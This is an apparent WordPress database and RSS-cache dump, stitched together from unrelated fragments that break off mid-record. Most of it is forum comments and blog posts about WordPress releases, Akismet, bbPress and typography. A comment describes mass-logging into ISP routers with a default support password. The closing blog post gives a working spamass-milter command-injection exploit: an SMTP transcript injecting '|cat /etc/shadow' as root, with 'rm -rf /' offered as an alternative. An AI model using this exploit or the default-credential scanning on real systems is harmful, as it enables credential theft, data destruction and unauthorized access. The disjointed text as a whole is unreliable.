But, I think in a case where the developer is dropping the ball on something as significant as this, we\'re left with no other choice if we want to continue to use the software.\n\nAnd, I do understand not wanting to rush a patch and the issues of testing, however... the first advisory for this issue went out on September 7th.  Don\'t you think 30 days is a bit much when it comes to releasing a patch for such a serious issue?  I mean, even Microsoft does a better job than that in most cases, as hard as it is for me to praise Microsoft.\n\nThe fact of the matter is this.  If it came down to Adobe making money off of patching this issue, I guarantee we would have seen a patch on the 8th.  But, the fact of the matter is, they\'re not treating this as a high priority issue because they\'re not really going to profit from it.\n\nAlso, because of the solution to the problem (simply adding bounds checking in a single DLL), there is no way that you will be able to convince me that it will take a month to develop a fix, test it, and then release it.  If it takes them that long to accomplish something as simple as this, maybe they\'re in the wrong industry.\n\nHell, the patch itself could be as simple as the one that Ramz Afzar released, which simply changed the call from strcat to strncat and defined the allowed string size.\n\nHere\'s my question to you.  I see that you\'re a web designer/flash developer.. so let me ask you this.\n\nIf there was a flash vulnerability that was discovered on September 7th and there were worms crawling the web actively exploiting it, would you feel comfortable knowing that your site is vulnerable until the 4th of October because Adobe isn\'t releasing a patch?  Also, how is that going to reflect on you if one (or many) of your clients websites get owned?\n\nI dunno, apparently I\'m the only one who finds this inexcusable.

The vulnerability is related to poor access control with the use of a standard \"support\" password in all devices. The concept behind support access is to give to an remote operator some information about the customer connection. But the separation is just visual. The admin pages can still be seen and modified even without its links.\n\nWhat I did was scan the operator\'s IP range for random IPs, and try to connect to HTTP using the standard credentials, get some pages and regex them to acquire BSSID and SSID. After getting these data, I try to get the device location using Google Geolocation and a script finishes the process storing the data in a database and generating a KML file. So, I can see the vulnerable devices in Google Earth.\n\nI wrote two articles in my blog explaining this (in portuguese).\n\nI didn\'t knew how to handle Skyhook\'s API so I fellback to Google. I think Google\'s WPS database is not stronger as Skyhook database is, and because of this article, I\'ll write a proof of concept to compare both.\n\nThanks!','2011-05-10 21:24:33','2011-05-11 02:24:33','0','0','613','','0'),(

An independent proxy functionality will probably be integrated into Chrome soon.  Google seems much more receptive of user input than Mozilla is lately.\n\nThere\'s still functionality I miss in Firefox but performance and stability with Chrome is worth the move for me.  I tend to have a bunch of browsers and tabs open with some of them open for days/weeks at a time.  I couldn\'t manage to keep this going with Firefox anymore...it brought my entire system to a crawl.

We have more planned for the customizer down the road.</p>\n<p>Throughout the rest of the admin you&#8217;ll notice tweaks to make your everyday life easier. For example, if you have lots of themes we&#8217;ve made it quicker to browse them all at once without paging. We&#8217;ve made it possible to use images from your media library to populate custom headers, and for you to choose the height and width of your header images.</p>\n<p>We&#8217;ve expanded our embed support to include tweets: just put a Twitter permalink on its own line in the post editor and we&#8217;ll turn it into a beautiful embedded Tweet. And finally, image captions have been improved to allow HTML, like links, in them.</p>\n<h3>For Developers</h3>\n<p>There are hundreds of under-the-hood improvements in this release, notably in the XML-RPC, themes, and custom header APIs, and significant performance improvements in WP_Query and the translation system. <a href=\"http://codex.wordpress.org/Version_3.4\">The Codex has a pretty good summary of the developer features</a>, and you can always <a href=\"http://core.trac.wordpress.org/milestone/3.4\">dive into Trac directly</a>.</p>\n<p>We&#8217;ve also <a href=\"http://wpdevel.wordpress.com/2012/06/07/wordpress-3-4-field-guide-for-developers/\">put together a busy developer&#8217;s field guide to the new APIs in 3.4</a>.</p>\n<h3>It takes a village</h3>\n<p>Here are some of the fine folks who were involved in bringing 3.4 to the world:</p>\n<p><a href=\"http://profiles.wordpress.org/082net\">082net</a>, <a href=\"http://profiles.wordpress.org/aaroncampbell\">Aaron D.

There are over <a href=\"http://wordpress.org/extend/plugins/\">19,000 plugins listed</a> and they&#8217;re really the heart and soul of WordPress for many people, so they deserve a little tender loving care. Here&#8217;s a quick before and after snapshot you can zoom in on to see a visual overview of some of the changes:</p>\n<p><a href=\"http://wpdotorg.files.wordpress.com/2012/05/contact-form-7.png\"><img src=\"http://s2.wp.com/imgpress?resize=690,350&amp;url=http://wpdotorg.files.wordpress.com/2012/05/contact-form-7.png&amp;unsharpmask=80,0.5,3\" alt=\"\" /></a></p>\n<p>Our first focus was around improving the discussion and support around plugins.</p>\n<p>You&#8217;ll now notice that threads about a plugin are pulled directly into a &#8220;support&#8221; tab on the plugin page &#8212; each plugin has its own forum. We&#8217;ve made authors much more prominent and with bigger Gravatars and better placement, so you can get a sense of who made the plugin you&#8217;re using. And finally to show how active and well-supported a plugin is, you can see  &#8221;16 of 75 support threads in the last two weeks have been resolved.&#8221; Finally, if you&#8217;re logged in you get access to the new &#8220;favorites&#8221; feature that lets you mark the plugins you use the most so you can share them on your profile page and find them quickly later. We soft-launched favorites a few days ago and there have already been 2,000 saved!</p>\n<p>If you&#8217;re a plugin author, we&#8217;ve started with a short threshold (2 weeks) for the resolved stats so it&#8217;s easy to catch up and stay on top of it. (It&#8217;ll eventually go to two months.) You also now have the ability to set stickies on your plugin forum to put FAQs or important information at the top, and of course any person you put as a committer on the plugin will have moderation access. People on the forum tag will see your custom header and links to the other resources attached to your plugin.</p>\n<p>We&#8217;ve tightened up the styling a bit on the forums and plugin pages, though still some cleanups to do there. Some older improvements you might have missed, but are still useful for users and developers alike:</p>\n<ul>\n<li>&#8220;Plugin headers&#8221; or those cool graphics you see at the top of plugin pages have really taken off, there are over 1,600 active now.</li>\n<li>You can now subscribe to get an email whenever a commit is made to a plugin repository even if it isn&#8217;t yours. There is no better way to follow the development of your favorite plugins.

As annual events go, it&#8217;s easily my favorite. Don&#8217;t get me wrong, I love attending <a title=\"WordCamp Central\" href=\"http://wordcamp.org\">WordCamps</a> and local <a title=\"WordPress on Meetup.com\" href=\"http://wordpress.meetup.com/\">WordPress meetups</a> (which are awesome and you should try to attend if you are able), but at the core team meetup, the focus on working together and getting things done is unique, as is the experience of every person in the room being so highly qualified. This year, instead of just planning a core team meetup, I&#8217;m aiming a little higher and shooting for a full-on contributor/community summit.</p>\n<p>Core code isn&#8217;t the only way to contribute to the WordPress project. We have an active <a title=\"Theme Review Team blog\" href=\"http://make.wordpress.org/themes/\">theme review team</a>, <a href=\"http://wordpress.org/support/\">support forum</a> volunteers, people writing <a href=\"http://codex.wordpress.org/Main_Page\">documentation</a>, plugin managers, community event organizers, translators, and more. The teams have been siloed for too long, so we&#8217;ve recently begun the process of bringing them together by having teams elect representatives to facilitate more communication between the contributor groups. These reps will form the nucleus of the contributor summit now being planned for a long weekend at the end of October in Tybee Island, GA. This is completely different from a WordCamp. It will be a combination of co-working, unconference, and discussions among the project leaders, and participation will be by invitation.</p>\n<p>In addition to bringing together the active contributor team reps to work together, I think it&#8217;s important to include community members who don&#8217;t fall into that category (at least not yet!). Successful WordPress-based business, authors of popular plugins and themes, and people using WordPress in unexpected but intriguing ways should have a place at the table, too. That said, part of the magic of the core team meetup is the small size; it allows every voice not only to be heard, but to engage. Since this is my first attempt at bringing together so many groups and points of view, I want to try and keep it small enough to retain that personal atmosphere while at the same time ensuring that the best possible mix of people and businesses in the WordPress ecosystem is represented. This is where you come in!</p>\n<p>Taking a cue from events with limited availability like <a title=\"AdaCamp\" href=\"http://dc.adacamp.org/\">AdaCamp</a> (attendance) and the <a title=\"jQuery Conference\" href=\"http://events.jquery.org/2012/sf/\">jQuery conference</a> (speaker roster), I want you to <a title=\"Nomination survey\" href=\"http://wordpressdotorg.polldaddy.com/s/2012-community-summit-nominations\">nominate people and/or WordPress-based businesses to participate in the summit</a>. Yes, you can nominate yourself.* You can nominate up to 10 additional people &#8212; be prepared to provide URLs and the reason you think they should participate. You can also nominate up to 10 WordPress-based businesses without naming individual people, so if there&#8217;s a theme or hosting company (for example) that you think should be there, you don&#8217;t need to go looking for employee names. This nomination process will hopefully ensure that we don&#8217;t overlook someone who is making a difference in our community when it comes time to issue invitations.</p>\n<p>Nominations will be open for a week, after which <a href=\"http://wordpressdotorg.polldaddy.com/s/2012-community-summit-nominations\">the survey</a> will be closed and the process of analyzing the results** will begin. The nominations process will lead to invitations in June, confirmations in July, planning in August and September, and the summit itself in October. Hopefully we can stream and/or record some of the activity to share online at <a href=\"http://wordpress.tv\">WordPress.tv</a>. Additional invitations may be extended up until the event if there are people/businesses that become more active in the community. If you&#8217;re thinking to yourself that maybe now&#8217;s the perfect time to start <a href=\"http://codex.wordpress.org/Contributing_to_WordPress\">contributing time to the WordPress project</a>, good thinking! In the meantime, if you want to weigh in, <a href=\"http://wordpressdotorg.polldaddy.com/s/2012-community-summit-nominations\">fill in the community summit nomination form</a>. Thanks, and wish us luck!</p>\n<p><em>* Nominating yourself: Do nominate yourself if you fall into one of the categories described in the post above, or if you believe that you have a unique point of view. Please do not nominate yourself if you just think it would be cool to hang out with this group. This is a working event, and everyone is expected to bring something special to the table.</em></p>\n<p><em>** I (and/or a helpful community volunteer) will sift through the nominations and compile a shortlist of the most-nominated people/businesses and the most intriguing underdogs.

Properly &#8220;curled&#8221; quotes, fancy dashes &#8212; like this &#8212; and more.</p>\n<p>I want to look specifically at dashes, and talk about how WordPress handles the conversion of hyphens to dashes.</p>\n<p>First, let&#8217;s talk about the three most common forms of horizontal strokes that exist. The first is the hyphen-minus. This is the key that is probably to the right of your &#8220;0&#8243; key on your keyboard. It is often called a &#8220;minus&#8221; or a &#8220;hyphen&#8221;. It is neither of these, and yet it is both. It is a special character that is somewhere in-between a minus sign and a hyphen. As such, it can serve either purpose. I&#8217;m just going to call that a &#8220;hyphen&#8221; for the rest of this post, just to save time.</p>\n<p>An em-dash (—) is a wide dash &#8212; the width of the letter &#8220;m&#8221; being its guiding length. Em-dashes signify a thought break, rather like parenthesis, but with a stronger implied break.</p>\n<p>An en-dash (–) is slightly shorter &#8212; the width of the letter &#8220;n&#8221; being its guiding length. En-dash use is probably one of the least known skills in everyday punctuation. The en-dash is used for:</p>\n<ul>\n<li>Ranges of number values: (2&#8211;4 teaspoons, from 1:00&#8211;2:30pm, ages 7&#8211;10)</li>\n<li>Relationships and connections: (a JFK&#8211;Atlanta flight, Bose&#8211;Einstein condensate, the Jackson&#8211;Murray fight, the Macy&#8211;Jaquith wedding)</li>\n<li>Attributive compounds: (pre&#8211;Vietnam War weapons, the ex&#8211;Vice President non&#8211;New York style pizza)</li>\n</ul>\n<p>Here&#8217;s how WordPress replaces hyphens with dashes:</p>\n<p>Foo {3 hyphens, spaced} Bar &rarr; Foo &#8212; Bar (em-dash)<br />\nFoo{3 hyphens, no space}Bar &rarr; Foo&#8212;Bar (em-dash)<br />\nFoo {2 hyphens, spaced} Bar &rarr; Foo &#8212; Bar (em-dash)</p>\n<p>Foo{2 hyphens, no space}Bar &rarr; Foo&#8211;Bar (en-dash)<br />\nFoo {1 hyphen, spaced} Bar &rarr; Foo &#8211; Bar (en-dash)</p>\n<p>The last replacement seems misguided, and I wish it weren&#8217;t made (or that it were an em-dash instead).</p>\n<p>So, three hyphens always gets you an em-dash. Two hyphens gets you an em-dash if spaced apart from surrounding words. Else, you get an en-dash. If you want more control, then I suggest you do as I do, and actually start typing the correct dashes (WordPress won&#8217;t mess with them). On OS X, en-dashes are typed with Opt-{hyphen}, and em-dashes are typed with Opt-Shift-{hyphen}. In Windows, en-dashes are typed with Alt + 0150, and em-dashes are typed with Alt + 0151.</p>\n<p>You can also type out the HTML entities in WordPress&#8217; HTML mode: <code>&amp;mdash;</code> and <code>&amp;ndash;</code>.</p>\n<br />  <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gocomments/markjaquith.wordpress.com/3873/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/comments/markjaquith.wordpress.com/3873/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/godelicious/markjaquith.wordpress.com/3873/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/delicious/markjaquith.wordpress.com/3873/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gofacebook/markjaquith.wordpress.com/3873/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/facebook/markjaquith.wordpress.com/3873/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gotwitter/markjaquith.wordpress.com/3873/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/twitter/markjaquith.wordpress.com/3873/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gostumble/markjaquith.wordpress.com/3873/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/stumble/markjaquith.wordpress.com/3873/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/godigg/markjaquith.wordpress.com/3873/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/digg/markjaquith.wordpress.com/3873/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/goreddit/markjaquith.wordpress.com/3873/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/reddit/markjaquith.wordpress.com/3873/\" /></a> <img alt=\"\" border=\"0\" src=\"http://stats.wordpress.com/b.gif?host=markjaquith.wordpress.com&blog=316&post=3873&subd=markjaquith&ref=&feed=1\" width=\"1\" height=\"1\" />\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Mon, 25 Jun 2012 15:59:01 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:12:\"Mark Jaquith\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:6;a:6:{s:4:\"data\";s:13:\"\n	\n	\n	\n	\n	\n	\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:2:{s:0:\"\";a:5:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:57:\"WordPress.tv: Julianne Taylor – Blogging on a Hot Topic\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:28:\"http://wordpress.tv/?p=11968\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:71:\"http://wordpress.tv/2012/06/25/julianne-taylor-blogging-on-a-hot-topic/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:2134:\"<p>Many WordPress users start out as bloggers and if they write engaging content on a hot topic then the site can grow quite fast.

Akismet is very heavily dependent on the quality of the data included in API calls.  Whether you&#8217;re developing a custom implementation, or maintaining an Akismet extension for a CMS or forum application, we&#8217;d like to help you get the best results possible.  Our API docs outline the basics.  This series will expand on that with some simple suggestions for developers.</p>\n<p>Our first recommendation:</p>\n<h3>Use an appropriate comment_type value.</h3>\n<p>Akismet works with almost any kind of user-submitted web content: blog comments, forum posts, blog posts, contact forms and so on.  The characteristics of spam tend to vary across those type &#8211; comment spam is quite different from forum spam.  So it&#8217;s important to give us some context by telling us what type of messages you&#8217;re asking Akismet to check.  That&#8217;s what the <a href=\"http://akismet.com/development/api/#comment-check\">comment_type value</a> is for.</p>\n<p>The API will accept an arbitrary string.  It&#8217;s best if you use a meaningful symbolic name.  We recommend the following values for common types of web-based content, which are mostly self-explanatory:</p>\n<blockquote>\n<dl>\n<dt>comment</dt>\n<dd>For blog comment forms.</dd>\n<dt>pingback</dt>\n<dt>trackback</dt>\n<dd>Pingbacks and trackbacks respectively.</dd>\n<dt>forum-post</dt>\n<dd>Forum posts and replies.</dd>\n<dt>blog-post</dt>\n<dd>Blog posts.</dd>\n<dt>contact-form</dt>\n<dd>Contact forms, inquiry forms and the like.</dd>\n<dt>signup</dt>\n<dd>Account signup, registration or activation.</dd>\n<dt>tweet</dt>\n<dd>Twitter messages</dd>\n</dl>\n</blockquote>\n<p>That&#8217;s not an exhaustive list.  If you need to check messages that don&#8217;t fit one of those categories, it&#8217;s best to use a different comment_type value.  It&#8217;s especially important not to default to <code>comment</code> for messages that are fundamentally different from blog comments &#8211; if you do that, you can expect to see mixed results.  It&#8217;s better to be too specific than too ambiguous.</p>\n<p>There&#8217;s no need to check with us first before using a different comment_type value &#8211; use your judgement and identify your messages as best you can.  To help make sure we&#8217;re interpreting your types correctly, please <a href=\"https://akismet.com/contact/\">drop us a line</a> &#8211; we&#8217;d love to hear from you.</p>\n<br />  <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gocomments/akismet.wordpress.com/715/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/comments/akismet.wordpress.com/715/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/godelicious/akismet.wordpress.com/715/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/delicious/akismet.wordpress.com/715/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gofacebook/akismet.wordpress.com/715/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/facebook/akismet.wordpress.com/715/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gotwitter/akismet.wordpress.com/715/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/twitter/akismet.wordpress.com/715/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gostumble/akismet.wordpress.com/715/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/stumble/akismet.wordpress.com/715/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/godigg/akismet.wordpress.com/715/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/digg/akismet.wordpress.com/715/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/goreddit/akismet.wordpress.com/715/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/reddit/akismet.wordpress.com/715/\" /></a> <img alt=\"\" border=\"0\" src=\"http://stats.wordpress.com/b.gif?host=blog.akismet.com&blog=116920&post=715&subd=akismet&ref=&feed=1\" width=\"1\" height=\"1\" />\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Tue, 19 Jun 2012 00:31:42 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:4:\"Alex\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:34;a:6:{s:4:\"data\";s:13:\"\n	\n	\n	\n	\n	\n	\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:2:{s:0:\"\";a:5:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:73:\"WordPress.tv: Hanni Ross: Five Ways to Break Your Blog- And How to Fix It\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:28:\"http://wordpress.tv/?p=11821\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:89:\"http://wordpress.tv/2012/06/18/hanni-ross-five-ways-to-break-your-blog-and-how-to-fix-it/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:1856:\"<div id=\"v-aIqQ5qio-1\" class=\"video-player\">\n</div>\n<br />  <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gocomments/wptv.wordpress.com/11821/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/comments/wptv.wordpress.com/11821/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/godelicious/wptv.wordpress.com/11821/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/delicious/wptv.wordpress.com/11821/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gofacebook/wptv.wordpress.com/11821/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/facebook/wptv.wordpress.com/11821/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gotwitter/wptv.wordpress.com/11821/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/twitter/wptv.wordpress.com/11821/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gostumble/wptv.wordpress.com/11821/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/stumble/wptv.wordpress.com/11821/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/godigg/wptv.wordpress.com/11821/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/digg/wptv.wordpress.com/11821/\" /></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/goreddit/wptv.wordpress.com/11821/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/reddit/wptv.wordpress.com/11821/\" /></a> <img alt=\"\" border=\"0\" src=\"http://stats.wordpress.com/b.gif?host=wordpress.tv&blog=5089392&post=11821&subd=wptv&ref=&feed=1\" width=\"1\" height=\"1\" /><div><a href=\"http://wordpress.tv/2012/06/18/hanni-ross-five-ways-to-break-your-blog-and-how-to-fix-it/\"><img alt=\"hanni ross &#8211;

This means we think it&#8217;s ready to release to everyone but want to get a few extra eyes on things before we do. It&#8217;s the second major iteration of bbPress as a plugin for your self-hosted WordPress powered website, and we think it&#8217;s pretty awesome.</p>\n<p>Even though bbPress 2.1 is almost ready to go, we don’t recommend you run it on a production site quite yet. Instead, set up a test site or a local installation to play with. If you find a bug, patch it or let us know. If you fix something, your prize will be pie and props.</p>\n<p>We are aiming to release bbPress 2.1 by the end of June, based on how the beta period goes. The more help we get with testing and fixing bugs, the sooner the final version ships. If you want to be a beta tester, check out the WordPress Codex article on <a href=\"http://codex.wordpress.org/Reporting_Bugs\">how to report feedback</a>.</p>\n<p>If you think you found a bug, please report it! Start by bringing it up in the support forums, or if you’ve confirmed that other people are experiencing the same bug you can report it on the <a href=\"http://bbpress.trac.wordpress.org\">bbPress Core Trac</a>.

Hooray!</p>\n<p>From Friendster to Flickr to Facebook I&#8217;ve always been active on other sites, what we now call social media, but as my interest in those has waxed and waned I&#8217;ve always come back to my home on the web, powered by Open Source software on a domain I own. This is definitely the longest sustained activity I&#8217;ve done, and I don&#8217;t see any reason why I wouldn&#8217;t continue the rest of my life, however long or short that may be.</p>\n<p>A little of my personal history with blogging: the first blog I remember reading was <a href=\"http://zeldman.com/\">Zeldman.com</a>, who also introduced me to building websites as a craft rather than an output of a program. His site was personal (<a href=\"http://www.zeldman.com/2012/06/15/divorce-keeps-breaking-your-heart/\">and still is</a>) but mixed in technology with a flair and often linked to the other strong voices on the web of its day, like <a href=\"http://dashes.com/\">Anil Dash</a> and <a href=\"http://kottke.org/\">Jason Kottke</a>. (Both still blogging today.) Everyone seemed to be using software called <a href=\"http://www.movabletype.org/\">Movable Type</a>, so I fired that up on <a href=\"http://matt.mullenweg.com/\">matt.mullenweg.com</a> and began haphazardly publishing. (I might dig up those entries and import them here at some point, though it would be really embarrassing.)</p>\n<p><span id=\"more-40699\"></span></p>\n<p>Much of my senior year was consumed by two things: preparing for my senior recital (I studied jazz saxophone at the <a href=\"http://en.wikipedia.org/wiki/High_School_for_the_Performing_and_Visual_Arts\">High School for the Performing and Visual Arts</a>) and participating in an economics competition called <a href=\"http://en.wikipedia.org/wiki/National_Fed_Challenge\">Fed Challenge</a>. Our team made it all the way to nationals, I believe the first academic competition our school had won, but did not win final award. (In a heart-wrenching turn of events, <a href=\"http://en.wikipedia.org/wiki/Susan_Bies\">Susan Bies</a> actually announced we won and we lept up to celebrate, then she said &#8220;Oh, so sorry.&#8221; and said the actual winners were another school, to this day we still don&#8217;t know why that happened.) Our economics teacher and coach, Scott Roman, set up a summer program where we&#8217;d all return back to Washington D.C. and for a few weeks to continue studying (and preparing next year&#8217;s team) and seeing everything we missed on our first trip.</p>\n<p>At the same time all this was going on, I had discovered the open source <a href=\"http://cafelog.com\">b2/cafelog blogging software</a>, and project called <a href=\"http://gallery.menalto.com/\">Gallery</a>. I was user #540 on the b2 forums (called &#8220;boardom&#8221;) and began helping out around there and publishing hacks, which were code modifications you&#8217;d copy and paste into files because there were no plugins at the time.</p>\n<p>I&#8217;m running out of time, so I&#8217;ll skip to the end: I started using Gallery on this site (the <a href=\"http://ma.tt/2002/06/gallery-6-1-2002/\">first album is from June 1</a>) and about two weeks later published the <a href=\"http://ma.tt/2002/06/airport/\">first post</a>, an emo complaint about airport security written while flying into DC. I never imagined when starting that I&#8217;d be able to keep it up for another month, much less a decade.</p>\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Sat, 16 Jun 2012 19:36:27

'21','3','open','http://www.interwebz.us/wordpress/?p=21','0','open','','2','So, on Sunday I got an email indicating that there\'s a remote root vulnerability in the Spamassassin Sendmail milter.  This immediately got my attention because I run both Sendmail and Spamassassin on my servers.  I found the proof of concept and began testing my servers.  Thankfully, I wasn\'t vulnerable, but I\'ll bet there are a lot of servers out there that are.  My servers arent vulnerable because I don\'t run Spamassassin as a milter, I run it as an externally called program from MailScanner.\n\n<!--more-->\n\nThose who are running Spamassassin as a milter should disable it immediately, or at least run it without the expand flag (-x), as the exploitation is trivial.\n\nHere\'s how it works, and the person who wrote this piece of code should be lynched.  This is taken from the spamass-milter source code:\n\n<code>\nmlfi_envrcpt(SMFICTX* ctx, char** envrcpt) {\nstruct context *sctx = (struct context*)smfi_getpriv(ctx);\nSpamAssassin* assassin = sctx-&gt;assassin;\nFILE *p;\n#if defined(__FreeBSD__)\nint rv;\n#endif</code>\n<code>\ndebug(D_FUNC, \"mlfi_envrcpt: enter\");\n<code>\nif (flag_expand) {\nchar buf[1024];\nchar *fmt=\"%s -bv \"%s\" 2&gt;&amp;1\"; &lt;-- Danger #1\n<code>\n#if defined(HAVE_SNPRINTF)\nsnprintf(buf, sizeof(buf)-1, fmt, SENDMAIL, envrcpt[0]); &lt;-- Danger #2\n#else\nsprintf(buf, fmt, SENDMAIL, envrcpt[0]);\n#endif</code></code></code>\n<code>\ndebug(D_RCPT, \"calling %s\", buf);\n<code>\n#if defined(__FreeBSD__)\nrv = pthread_mutex_lock(&amp;popen_mutex);\nif (rv)\n{\ndebug(D_ALWAYS, \"Could not lock popen mutex: %s\", strerror(rv));\nabort();\n}\n#endif\n<code>\np = popen(buf, \"r\"); &lt;-- Danger #3\nif (!p)\n{\ndebug(D_RCPT, \"popen failed(%s).  Will not expand aliases\", strerror(errno));\nassassin-&gt;expandedrcpt.push_back(envrcpt[0]);</code></code></code>\n\nSo, I\'ve pointed out the dangerous sections of the code.\n\n1) %s = string, which is user supplied..\n\n2) %s (\'envrcpt\'-more on this in a minute) is being copied into \'buf\'.  At least they did bounds checking.\n\n3) They\'re now using popen() to open whats been stored in \'buf\'.  Fricken. Morons.  popen() executes whatever command that is given to it.\n\nSo, lets look at how to exploit this.  We know that \'rcpt\' is being copied from the input into \'buf\' and being executed by popen() without any form of sanity check.  How about we try something like this:\n\n<code>\nTrying x.x.x.x...\nConnected to some.host.com.\nEscape character is \'^]\'.\nhelo interwebz.us\n220 some.host.com ESMTP Sendmail 8.14.1/8.14.1; Wed, 17 Mar 2010 23:06:15 -0500\n250 some.host.com Hello interwebz.com [1.2.3.4], pleased to meet you\nmail from:\n250 2.1.0 ... Sender ok\nrcpt to: root+:\"|cat /etc/shadow\"\n....this is where the password file would be displayed...</code>\n\nYou could just as easily replace \"cat /etc/shadow\" with \"rm -rf /\".  The key is the pipe ( | ).  Sendmail will execute anything after the pipe as suid root, which means instant priviledge escalation without even having to do any stack smashing.\n\nI can\'t believe that in 2010 we\'d still be coming across idiotic errors like this one.','','2010-03-17 23:29:41','2010-03-18 04:29:41','','','2010-03-17 23:29:41','2010-03-18 